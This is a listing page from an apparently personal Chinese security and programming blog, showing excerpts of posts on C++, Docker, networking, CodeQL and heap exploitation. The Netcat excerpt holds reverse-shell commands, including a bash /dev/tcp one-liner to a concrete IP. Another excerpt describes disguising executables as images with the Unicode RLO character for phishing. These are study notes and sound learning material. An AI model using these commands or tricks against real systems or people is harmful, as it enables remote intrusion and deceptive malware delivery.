1.如果注册表项下面有&quot;SystemComponent&quot;字段并且值等于1时，表示这是个系统组件，而不是应用软件。2.如果注册表项下面有&quot;ParentKeyName&quot;字段则表示该项是某个分类下的子项，一般情况补丁才会有&quot;ParentKeyName&quot;字段。比如这个&qu ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/11/13/typedef/" title="C++ Typedef用法"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/20.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++ Typedef用法"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/11/13/typedef/" title="C++ Typedef用法">C++ Typedef用法</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-11-13T13:45:12.000Z" title="发表于 2019-11-13 21:45:12">2019-11-13</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">C++ Typedef用法
用途一：
定义一种类型的别名，而不只是简单的宏替换。可以用作同时声明指针型的多个对象。比如：
char* pa, pb; // 这多数不符合我们的意图，它只声明了一个指向字符变量的指针， 和一个字符变量；
以下则可行：
typedef char* PCHAR;PCHAR pa, pb; 
这种用法很有用，特别是char* pa, pb的定义，初学者往往认为是定义了两个字符型指针，其实不是，而用typedef char* PCHAR就不会出现这样的问题，减少了错误的发生。
用途二:
用在旧的C代码中，帮助struct。以前的代码中，声明struct新对象时，必须要带上struct，即形式为： struct 结构名对象名，如：
struct tagPOINT1 &#123;    int x;    int y; &#125;;struct tagPOINT1 p1;
而在C++中，则可以直接写：结构名对象名，即：tagPOINT1 p1;
typedef struct tagPOINT&#123;    int x;    int y;&#125;POINT; ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/10/12/LinuxInstallJavaEnvironment/" title="Linux安装java环境"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/12.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux安装java环境"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/10/12/LinuxInstallJavaEnvironment/" title="Linux安装java环境">Linux安装java环境</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-10-11T16:00:00.000Z" title="发表于 2019-10-12 00:00:00">2019-10-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/java%E7%8E%AF%E5%A2%83/">java环境</a></span></div><div class="content">通用系统安装

下载完成后解压到指定文件下

先创建java文件目录，如果已存在就不用创建mkdir -p /usr/local/java

解压到java文件目录

tar -vzxf jdk-8u161-linux-x64.tar.gz -C /usr/local/java/

添加环境变量，编辑配置文件

vi /etc/profile

在文件最下方或者指定文件添加

export JAVA_HOME=/usr/local/java/jdk1.8.0_161export CLASSPATH=$:CLASSPATH:$JAVA_HOME/lib/export PATH=$PATH:$JAVA_HOME/bin

保存退出

source /etc/profile

最后测试

java -version

可以看到一下信息则表示配置成功

java version “1.8.0_161”Java™ SE Runtime Environment (build 1.8.0_161-b12)Java HotSpot™ 64-Bit Server VM (build 25.161-b12 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/08/19/NetcatReboundShell/" title="Netcat反弹Shell详解"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/29.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Netcat反弹Shell详解"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/19/NetcatReboundShell/" title="Netcat反弹Shell详解">Netcat反弹Shell详解</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-19T14:51:42.000Z" title="发表于 2019-08-19 22:51:42">2019-08-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Netcat/">Netcat</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

Windows

进入下载地址下载文件https://eternallybored.org/misc/netcat/
将文件夹中的对应可执行文件复制到C:\Windows\System32的文件夹下(有32位版和64位版)
直接打开cmd输入nc XXXXXX执行就好

Linux

直接使用nc命令就好

自己常用的命令

Windows

nc -e cmd.exe -d IP port(靶机)

Linux

nc -lvvp 8080(监听机)  监听8080端口nc IP Port (受害者机)   IP为监听机的IP 端口为监听机开的端口bash -i &gt;&amp; /dev/tcp/3.16.30.73/1231 0&gt;&amp;1(受害者机)
主要参数
#无命令行界面,使用后台模式-d#程序重定向 -e#源路由跳跃点, 不超过8-g#源路由指示器: 4, 8, 12, ...-G       #获取帮助 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/08/15/Docker/" title="Docker笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/24.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Docker笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/08/15/Docker/" title="Docker笔记">Docker笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-08-15T13:01:07.000Z" title="发表于 2019-08-15 21:01:07">2019-08-15</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.611Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Docker/">Docker</a></span></div><div class="content">安装docker
sudo apt install docker.io
问题解决
0x01 运行docker-compose 命令报错解决办法
-bash: docker-compose: command not found

安装

先安装 pip ，检查是否已有： pip -V 

报错

-bash: pip: command not found

安装 pip 

sudo apt-get install epel-releasesudo apt-get install python-pip

升级

pip install --upgrade pip

安装Docker-Compose

pip install docker-compose

检查是是否成功

docker-compose -version
0x02 使用docker-compose报错找不到 ssl_match_hostname解决办法

进入backports模块路径

cd /usr/local/lib/python2.7/dist-packages

复制整个包到transport包路径下

cp - ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2019/05/26/ReleaseExeResourceFiles/" title="如何释放存在EXE上的资源文件"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/26.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="如何释放存在EXE上的资源文件"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/05/26/ReleaseExeResourceFiles/" title="如何释放存在EXE上的资源文件">如何释放存在EXE上的资源文件</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-05-26T04:33:42.000Z" title="发表于 2019-05-26 12:33:42">2019-05-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.633Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">添加资源到项目中
直接参考图片就行

生成EXE文件
下载ResourceHacker程序
把程序导入ResourceHacker中

使用FindResource函数提取PE资源
类型为SETIMG
LPCWSTR b = _T(&quot;SETIMG&quot;);HMODULE hLocalHostModule = GetModuleHandleA(NULL);HRSRC hRsrc = FindResource(hLocalHostModule, (LPCTSTR)106, b);
</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2019/02/10/MakingPhishingDocumentsUsingUnicode/" title="利用Unicode实现钓鱼文件制作"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/17.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="利用Unicode实现钓鱼文件制作"></a></div><div class="recent-post-info"><a class="article-title" href="/2019/02/10/MakingPhishingDocumentsUsingUnicode/" title="利用Unicode实现钓鱼文件制作">利用Unicode实现钓鱼文件制作</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2019-02-10T02:31:40.000Z" title="发表于 2019-02-10 10:31:40">2019-02-10</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E9%92%93%E9%B1%BC/">钓鱼</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a></span></div><div class="content">关于Unicode
Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。
简单来说，它是一种编码格式，满足了以前ASCII码无法表示中文、日文等其他语言的缺陷，但是由此引发的安全问题也很多，比如我们今天介绍的Unicode控制符反转伪装后缀名漏洞。
实现方法
替换图标
就是把exe的图标替换成图片的默认图标，或者插入一些羞羞的图片或者QQ图标之类的。
插入控制符
右键选择重命名，删除原文件名，再右键单击，选择“插入Unicode控制符”，选择RLO

构建文件名
需要用两部来制作

gpj.exe
Ascotb

效果如下图

</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2018/12/08/C++TheProblemOfIncomingParameters/" title="c++传入参数的问题"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/36.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="c++传入参数的问题"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/12/08/C++TheProblemOfIncomingParameters/" title="c++传入参数的问题">c++传入参数的问题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-12-08T07:54:07.000Z" title="发表于 2018-12-08 15:54:07">2018-12-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.827Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

int tex (int a,int b)
值传递：有一个形参向函数所属的栈拷贝数据的过程，如果值传递的对象是类对象或是大的结构体对象，将耗费一定的时间和空间。
int tex(int *a,int *b)
指针传递：同样有一个形参向函数所属的栈拷贝数据的过程，但拷贝的数据是一个固定为4字节的地址。
int tex(int &amp;a,int &amp;b)
引用传递：同样有上述的数据拷贝过程，但其是针对地址的，相当于为该数据所在的地址起了一个别名。
效率上讲，指针传递和引用传递比值传递效率高。一般主张使用引用传递，代码逻辑上更加紧凑、清晰。
引用传递做函数参数”是C++的特性，C语言不支持。
tip：
如果是值的传递，是拷贝过去的就是在用的函数中修改了那个值也不会影响到原先的值
若果是引用的传递，虽然是数据拷贝但是在用的函数中修改了那个值是会影响到原先的值

</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2018/11/30/SomeAdditionsToTheSubnetMask/" title="子网掩码的一些补充"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/40.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="子网掩码的一些补充"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/11/30/SomeAdditionsToTheSubnetMask/" title="子网掩码的一些补充">子网掩码的一些补充</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-11-30T05:27:53.000Z" title="发表于 2018-11-30 13:27:53">2018-11-30</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/">子网掩码</a></span></div><div class="content">10.0.0.0/8划分为8个子网
因为10.0.0.0/8子网掩码为255.0.0.0  子网的范围从10.0.0.0-10.255.255.255
那么网络位位数增加3位，那么子网掩码为：255.224.0.0，那么：

子网1：即10.0.0.0/11，范围：10.0.0.0-10.31.255.255
子网2：即10.32.0.0/11，范围：10.32.0.0-10.63.255.255
子网3：即10.64.0.0/11，范围：10.64.0.0-10.95.255.255
子网4：即10.96.0.0/11，范围：10.96.0.0-10.127.255.255
子网5：即10.128.0.0/11，范围：10.128.0.0-10.159.255.255
子网6：即10.160.0.0/11，范围：10.160.0.0-10.191.255.255
子网7：即10.192.0.0/11，范围：10.192.0.0-10.223.255.255
子网8：即10.224.0.0/11，范围：10.224.0.0-10.255.255.255
范围IP的头尾分别是网络地址和广 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2018/06/10/StackAndQueueInC++/" title="C++中栈和队列"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/37.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="C++中栈和队列"></a></div><div class="recent-post-info"><a class="article-title" href="/2018/06/10/StackAndQueueInC++/" title="C++中栈和队列">C++中栈和队列</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2018-06-10T11:20:25.000Z" title="发表于 2018-06-10 19:20:25">2018-06-10</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C/">C++</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%98%9F%E5%88%97/">队列</a></span></div><div class="content">一.解释：
1.栈
栈是一种特殊的线性表。其特殊性在于限定插入和删除数据元素的操作只能在线性表的一端进行。如下所示：

结论：后进先出（Last In First Out），简称为LIFO线性表。
举个例子：你在洗碗把洗好的碗编号为依次摞起来，号在最下面，向上编号依次增加，然后再从上到下把碗放好，这样的话，先被洗的碗，就后被放好。
2.队列
队列(Queue)也是一种运算受限的线性表，它的运算限制与栈不同，是两头都有限制，插入只能在表的一端进行(只进不出)，而删除只能在表的另一端进行(只出不进)，允许删除的一端称为队尾(rear)，允许插入的一端称为队头 (Front),如图所示：

结论：队列的操作原则是先进先出的，所以队列又称作FIFO表(First In First Out)
举个例子：超市付账的时候排队，先来的先排在最前面，后来的后排在队伍最后面，付账时排在队伍前面的先付账，排在后面的后付账。
二.用法
1.头文件
#include&lt;queue&gt;// 队列 #include&lt;stack&gt;//栈
2.定义方式
stack&lt;int&gt;  s;//参 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2017/12/04/NetworkProtocol/" title="TCP/IP"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/38.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="TCP/IP"></a></div><div class="recent-post-info"><a class="article-title" href="/2017/12/04/NetworkProtocol/" title="TCP/IP">TCP/IP</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2017-12-03T20:27:07.000Z" title="发表于 2017-12-04 04:27:07">2017-12-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.849Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/TCP-IP/">TCP/IP</a></span></div><div class="content">在2018/12/15日重构，原转载文章以删除
在2019/1/11日更新
网络协议的分层以及传输流程

关于四层网络协议在Wireshark中对应的位置




OSI中的层
功能
TCP/IP协议族




7 应用层
文件传输，电子邮件，文件服务，虚拟终端
TFTP，HTTP，SNMP，FTP，SMTP，DNS，Telnet 等等


6 表示层
数据格式化，代码转换，数据加密
没有协议


5 会话层
解除或建立与别的接点的联系
没有协议


4 传输层
提供端对端的接口
TCP，UDP


3 网络层
为数据包选择路由
IP，ICMP，OSPF，EIGRP，IGMP，ARP


2 数据链路层
传输有地址的帧以及错误检测功能
SLIP，CSLIP，PPP，MTU


1 物理层
以二进制数据形式在物理媒体上传输数据
ISO2110，IEEE802，IEEE802.2



一个包传输的过程如下图

TCP和UDP的区别？
手机的主要功能只有两个–电话和短信，这两种方式的本质差别就是，打电话的时候要先“建立连接”(拨号)，而短信不需要，建立连接需要花费一些时间，但也意味着更加可 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/1022/01/20/WindowsVulnerabilityAnalysis/" title="Windows漏洞分析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/137.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Windows漏洞分析"></a></div><div class="recent-post-info"><a class="article-title" href="/1022/01/20/WindowsVulnerabilityAnalysis/" title="Windows漏洞分析">Windows漏洞分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="1022-01-20T15:40:42.000Z" title="发表于 1022-01-20 23:46:25">1022-01-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Windows/">Windows</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

前言
阿巴阿巴
准备工作

两台机器网络必须联通，并且被调试的机器关闭所有的防火墙
调试的机器需要在Microsoft Store中下载安装WinDbg Preview

配置环境
虚拟机
首先需要在虚拟机中设置串口，如下图

进入需要被调试的机器，创建启动选项卡并且设置开机选择的方式等待时间为10秒（不设置也行，这样设置是为了区分
bcdedit /copy &#123;current&#125; /d &quot;KernelDebug&quot;bcdedit /timeout 10
重启机器进入我们设置好的选项卡

运行如下命令
#关闭强制数字签名bcdedit -set loadoptions DDISABLE_INTEGRITY_CHECKS#开启系统测试模式#关闭时使用bcdedit /set testsigning offbcdedit /set testsigning on#开启调试功能bcdedit /deb ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/1022/01/06/CodeQL/" title="CodeQL学习笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/136.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CodeQL学习笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/1022/01/06/CodeQL/" title="CodeQL学习笔记">CodeQL学习笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="1022-01-06T15:53:53.000Z" title="发表于 1022-01-06 23:59:36">1022-01-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.848Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CodeQL/">CodeQL</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

关于搭建就不写了，网上太多了，内容大部分都来着互联网，我只是做个记录，方便自己查询

基本查询结构
为了使用CodeQL进行定制分析，我们可以通过自己编写查询来实现查找漏洞或错误。CodeQL的查询类型有：

告警查询：突出显示代码中特定位置的问题的查询。
路径查询：代码中source和sink之间信息流的查询。

用CodeQL编写的查询文件扩展名为.ql，并包含一个select子句。
import &lt;language&gt; /* 导入对应的语言包 *//* 可能存在的 一些谓词 类的设置 */from /* 声明变量等 */where /* 设置逻辑表达式 */select /* 打印结果 */
CodeQL主要使用逻辑连接词(如and、 or、 not)， 限定词(如forall 、exists)， 还有谓词(predicates)等重要逻辑概念。同时CodeQL也提供了递归的支持和聚合(如count、  ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/1021/07/31/HeapOverflow_Linux_0x02/" title="Linux堆溢出总结（0x02）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/125.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux堆溢出总结（0x02）"></a></div><div class="recent-post-info"><a class="article-title" href="/1021/07/31/HeapOverflow_Linux_0x02/" title="Linux堆溢出总结（0x02）">Linux堆溢出总结（0x02）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="1021-07-31T15:40:42.000Z" title="发表于 1021-07-31 23:46:25">1021-07-31</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-05T06:17:01.847Z" title="更新于 2023-01-05 14:17:01">2023-01-05</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

缓冲了2个月重新捡起来，有些地方还是没太懂 看来还是二次搁浅了

关于几个知识点
我们在进行堆学习的时候那么就是主要针对的是Linux的动态链接库也就是glibc，但是由于一个系统只存在一个glibc，我们要是进行切换的话会很麻烦，所以下面记几个知识点

libc-database

有一些PWN题故意不给libc文件，但是有泄露地址，libc database可以利用泄露的地址来确定服务器使用的libc。
git clone https://github.com/niklasb/libc-databasecd libc-database./get all #下载全部libc文件./get Ubuntu #下载Ubuntu所有libc文件
程序会自动在ubuntu网站上下载相关的libc文件，存储到./db文件夹下

glibc-all-in-one

里面有对libc的库，官方文档听清楚的我就不概述了
git clo ...</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，否则与作者无关，如果您不同意请关闭本站<img src= "/img/loading.gif" data-lazy-src="/img/announcement2.gif" style="zoom:25%;" ></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/27/FurtherMathematics_0x06/" title="函数的单调性、曲线的凹凸性、极值与最大最小值"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/159.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="函数的单调性、曲线的凹凸性、极值与最大最小值"/></a><div class="content"><a class="title" href="/2023/02/27/FurtherMathematics_0x06/" title="函数的单调性、曲线的凹凸性、极值与最大最小值">函数的单调性、曲线的凹凸性、极值与最大最小值</a><time datetime="2023-02-27T15:58:53.000Z" title="发表于 2023-02-27 23:58:53">2023-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/27/FurtherMathematics_0x07/" title="不定积分"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/160.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="不定积分"/></a><div class="content"><a class="title" href="/2023/02/27/FurtherMathematics_0x07/" title="不定积分">不定积分</a><time datetime="2023-02-27T15:58:53.000Z" title="发表于 2023-02-27 23:58:53">2023-02-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/26/FurtherMathematics_0x05/" title="泰勒展开"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/158.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="泰勒展开"/></a><div class="content"><a class="title" href="/2023/02/26/FurtherMathematics_0x05/" title="泰勒展开">泰勒展开</a><time datetime="2023-02-26T15:58:53.000Z" title="发表于 2023-02-26 23:58:53">2023-02-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/16/FurtherMathematics_0x04/" title="洛必达法则"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/157.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="洛必达法则"/></a><div class="content"><a class="title" href="/2023/02/16/FurtherMathematics_0x04/" title="洛必达法则">洛必达法则</a><time datetime="2023-02-16T15:58:53.000Z" title="发表于 2023-02-16 23:58:53">2023-02-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/14/FurtherMathematics_0x03/" title="微分中值定理"><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/156.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="微分中值定理"/></a><div class="content"><a class="title" href="/2023/02/14/FurtherMathematics_0x03/" title="微分中值定理">微分中值定理</a><time datetime="2023-02-14T15:58:53.000Z" title="发表于 